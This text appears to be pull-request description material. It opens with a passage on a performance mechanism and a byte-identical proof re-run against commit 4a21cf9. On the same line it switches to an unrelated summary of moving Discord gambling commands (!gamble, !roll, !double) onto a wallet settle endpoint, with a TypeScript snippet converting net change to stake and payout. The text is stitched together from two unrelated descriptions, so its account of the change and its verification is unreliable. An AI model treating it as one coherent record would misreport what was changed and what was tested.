- Mechanism 2 is priced by counting, not timing: ~300 (L0) + ~106×levels row copies and their allocations move off the critical serial path between the query grind and the induce; bounded ~0.1–0.3 ms plus allocator-contention trim. Sub-offset alone — which is why it ships inside the basket rather than as its own slot.

## Verification

- **Cross-binary proof identity re-run on THIS base with all four mechanisms**: pristine `4a21cf9` worker vs this tree's worker, same seed 424242, `cmp` byte-identical (twenty-third consecutive base on which this account's identity gate has passed). ## Summary

`!gamble`/`!roll`/`!double` read the canonical SPMT balance but wrote the outcome back as a flat new total (`setPoints(result.newTotal)`), which lands on DSH's legacy leaderboard — so a Discord wager silently spent a different balance than `!points` reports, and a jackpot would have added the whole payout to lifetime XP. In Discord they now settle through DiscordStreamHub#26 instead.

The handlers report a *net change*, while the wallet needs stake and gross payout, so the dispatcher converts:

```ts
const payout = max(0n, wager + change);   // 500 staked, +250 profit => wager 500, payout 750
settleWager(user, { wager, payout, newTotal, eventType })
```

`settleWager` in `points.ts` mirrors the existing `getPointBalance`/`setPoints` split: inside a Discord output context it calls the settle endpoint with a per-wager `idempotencyKey`; anywhere else (Twitch, Kick, any call passing a `StorageContext`) it falls through to the old `setPoints(newTotal)` on tenant storage, so nothing changes off-Discord.

`RollResult`/`DoubleResult` gained `betAmount` — the stake was previously only reachable as a string sliced out of `change`, which is wrong for partial losses and for `!double` (where the real stake is `wager * 2`).

Verified with `tests/discord-gamble-settlement.test.ts` (win maps to stake+profit, loss settles with payout 0 and never calls `/api/points/set`), `tests/discord-points-commands.test.ts`, `npm run typecheck`, `npm run lint`.
